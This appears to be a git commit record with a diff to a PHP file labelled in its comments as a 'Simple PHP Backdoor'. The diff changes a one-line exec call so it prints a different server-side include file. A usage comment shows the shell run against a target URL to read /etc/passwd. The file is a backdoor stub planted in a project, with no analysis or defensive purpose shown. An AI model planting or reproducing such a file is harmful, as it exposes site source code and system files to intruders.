23f0581c1f4e12d9a0eef119665c65dbebf222e2
Void <51586851+Val0id@users.noreply.github.com>
2023-02-07 02:17:51 +0700

    ttt

--- ttt.php
+++ ttt.php
@@ -1,3 +1,3 @@
 <!-- Simple PHP Backdoor By DK (One-Liner Version) -->
 <!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
-<?php echo exec("cat search.php"); ?>
+<?php echo exec("cat ./includes/footer.inc.php"); ?>
